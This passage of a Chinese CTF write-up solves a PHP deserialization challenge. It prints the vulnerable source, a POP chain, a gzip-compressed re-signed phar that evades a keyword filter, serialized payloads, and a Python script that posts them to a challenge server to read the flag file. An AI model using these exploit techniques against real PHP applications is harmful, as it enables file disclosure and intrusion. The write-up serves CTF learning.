function">__set</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">act</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$p</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">tree</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">apple</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">xxx</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">D</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"It is file"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"You can look at the others"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">banana</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// flag in /</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">55</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"str too long"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#__set():方法的作用是为私有成员属性设置值，这个方法同样不用手动调用，是在设置私有属性值得时候自动调用的</span><span class="token shell-comment comment">#__destruct():在到某个对象的所有引⽤都被删除或者当对象被显式销毁时执⾏</span><span class="token shell-comment comment">#__call():着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。</span><span class="token shell-comment comment">#__get():当我们试图获取一个不可达属性时(比如private)，类会自动调用__get函数</span></code></pre><p>注意到对传入数据进行waf，可以利用gzip压缩phar绕过waf函数过滤。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最终的pop链为tree:__destruct -&gt; tree:__call -&gt; apple:__get -&gt; air:__set，将链子初步写好。<br>链子末端是个new一个类，打原生类就行，用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">air</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">tree</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">apple</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#tree:__destruct -> tree:__call -> apple:__get -> air:__set -> tree:act</span><span class="token variable">$tree1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">act</span><span class="token operator">=</span><span class="token string">'SplFileObject'</span><span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$tree2</span><span class="token punctuation">;</span><span class="token variable">$apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">xxx</span><span class="token operator">=</span><span class="token variable">$air</span><span class="token punctuation">;</span><span class="token variable">$tree</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$apple</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$tree1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后是生成phar文件，是一个相对固定的内容，有板子</p><pre class=" language-php"><code class="language-php"><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件,随便新建一个文件内容随意</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>生成phar用的最终exp</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">air</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">tree</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">apple</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#tree:__destruct -> tree:__call -> apple:__get -> air:__set -> tree:act</span><span class="token variable">$tree1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">act</span><span class="token operator">=</span><span class="token string">'SplFileObject'</span><span class="token punctuation">;</span><span class="token variable">$air</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$tree2</span><span class="token punctuation">;</span><span class="token variable">$apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">xxx</span><span class="token operator">=</span><span class="token variable">$air</span><span class="token punctuation">;</span><span class="token variable">$tree</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$apple</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$tree1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$tree</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件,随便新建一个文件内容随意</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>注意想要生成phar文件，一定要先在php.ini中将phar.readonly改为off，同时还要去掉前面的;（没去分号卡住好长时间）<br>然后是想办法利用<a href="http://blog.m1kael.cn/index.php/archives/14/">PHP的GC机制</a>绕过<code>throw new Error("start");</code>触发最开始的__destruct。将phar最后的}去掉来进行绕过。<br>传值以及生成的phar文件都需要改。</p><pre class=" language-1"><code class="language-1">origin:1:O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:18:"FilesystemIterator";}}s:4:"flag";s:11:"glob:///*f*";}s:3:"act";N;}2:O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:13:"SplFileObject";}}s:4:"flag";s:8:"/fflaggg";}s:3:"act";N;}change:1:a:2:{i:0;O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:18:"FilesystemIterator";}}s:4:"flag";s:11:"glob:///*f*";}s:3:"act";N;}i:0;i:0;}2:a:2:{i:0;O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:13:"SplFileObject";}}s:4:"flag";s:8:"/fflaggg";}s:3:"act";N;}i:0;i:0;}</code></pre><p>控制r和w的post值</p><pre class=" language-1"><code class="language-1">O:1:"D":1:{s:5:"start";s:1:"w";}O:1:"D":1:{s:5:"start";s:1:"r";}</code></pre><pre class=" language-1"><code class="language-1">a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"w";}i:0;i:0;}a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"r";}i:0;i:0;}</code></pre><p>我们需要先写入再读取。<br>写个exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> gzip<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1url<span class="token operator">=</span><span class="token string">'http://130f177f-0ef5-4dfa-a37e-4e739a0f62e2.node4.buuoj.cn:81/'</span><span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改内容后的phar文件</span>    s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取要签名的数据</span>    h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取签名类型以及GBMB标识</span>    newf <span class="token operator">=</span> s<span class="token operator">+</span>sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>h <span class="token comment" spellcheck="true"># 数据 + 签名 + 类型 + GBMB</span>    open<span class="token punctuation">(</span><span class="token string">'signed.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 写入新文件</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f1<span class="token punctuation">:</span>        content <span class="token operator">=</span> f1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        f <span class="token operator">=</span> gzip<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'signed.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#O:1:"D":1:{s:5:"start";s:1:"w";}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'0'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"w";}i:0;i:0;}'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#O:1:"D":1:{s:5:"start";s:1:"r";}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'0'</span><span class="token punctuation">:</span><span class="token string">'phar://'</span><span class="token operator">+</span>name<span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'a:2:{i:0;O:1:"D":1:{s:5:"start";s:1:"r";}i:0;i:0;}'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sign<span class="token punctuation">(</span><span class="token string">'phar2.phar'</span><span class="token punctuation">)</span>    compress<span class="token punctuation">(</span><span class="token string">'signed.phar'</span><span class="token punctuation">)</span>    write<span class="token punctuation">(</span><span class="token string">'signed.phar.gz'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#make()</span><span class="token comment" spellcheck="true">#/tmp/ed6c14fc4040cead84ef452e38733fde.jpg</span><span class="token comment" spellcheck="true">#fflaggg</span><span class="token comment" spellcheck="true">#/tmp/be6b937efc31e88f2f1aec546bf42636.jpg</span><span class="token comment" spellcheck="true">#Dest0g3{a9e928e2-77ec-42b4-9028-6d2653885a19}</span>read<span class="token punctuation">(</span><span class="token string">'/tmp/be6b937efc31e88f2f1aec546bf42636.jpg'</span><span class="token punctuation">)</span></code></pre><p>得到flag:Dest0g3{a9e928e2-77ec-42b4-9028-6d2653885a19}</p><h2 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h2><p>提示查看图片，查看图片源代码，发现</p><pre class=" language-base64"><code class="language-base64">Oh you find key:dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpc